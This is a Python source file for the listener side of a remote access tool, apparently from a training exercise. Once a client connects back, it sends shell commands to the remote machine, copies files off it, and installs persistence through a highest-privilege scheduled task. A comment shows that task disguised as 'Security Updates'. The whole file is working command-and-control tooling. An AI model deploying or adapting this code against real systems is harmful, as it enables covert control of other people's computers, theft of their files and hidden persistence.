import socket 
import os
import select

IPAddr = "192.168.168.1"
Port = 8080

def transfer(conn, command, file):
    
    conn.send(command.encode())
    outfile = file.split('/')[-1]
    with open(outfile,'wb') as f:
        while True: 
            response = conn.recv(1024)
            if 'Unable to locate the file' in response.decode():
                print('[-] Unable to locate the file')
                break
            if response.decode().endswith('Transfer Completed'):
                print('[+] Transfer completed ')
                break
            f.write(response)

def persist(conn, command):
    vars = command.split('&')
    conn.send('SC Config Schedule Start= Auto'.encode())
    persistCommand = f'SCHTASKS /CREATE /TN {vars[1]} /TR {vars[2]} /SC {vars[3]} /ST {vars[4]} /RU {vars[5]} /RP {vars[6]} /RL HIGHEST'.encode()
    print(persistCommand)
    conn.send(persistCommand)
    print(conn.recv(1024).decode()) 


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((IPAddr, Port))
    s.listen(1)
    print(f'[+] Listening on port {Port}')
    conn, addr = s.accept()
    print(f'[+] Connection established with: {addr}')

    while True:
        conn.send('whoami'.encode()) 
        user = conn.recv(1024).decode().strip()
        command = input(f"{user}> ")

        if 'persist' in command:
            try:
                persist(conn, command)
            except IndexError as e:
                print("Make sure you use the proper syntax:")
                print("persist&<'task name'>&<'path to script'>&<type>&<start time>&<username>&<password>")
                print("See script notes for proper example.")

                # persist&"Security Updates"&"'C:\Users\BobbyTestUser\AppData\Local\Programs\Python\Python37\python.exe' C:\Users\BobbyTestUser\Desktop\FinalExerciseClient.py"&Minute&06:59&BobbyTestUser&Password

        elif 'exit' in command:
            conn.send('exit'.encode())
            conn.close() 
            break

        elif 'transfer' in command:
        # Copy file from remote machine
        # Example: transfer C:\Users\mafranks\Desktop\photo.jpg
            try:
                file = command.split('&')[1]
                transfer(conn, command, file)
            except IndexError as e:
                print("Make sure you use the proper syntax:")
                print("transfer&C:/Users/mafranks/Desktop/photo.jpg")
                pass

        else:
            conn.send(command.encode()) 
            readable = select.select([conn], [], [], 0.5)[0]
            if readable:
                print(conn.recv(1024).decode()) 
        
connect()


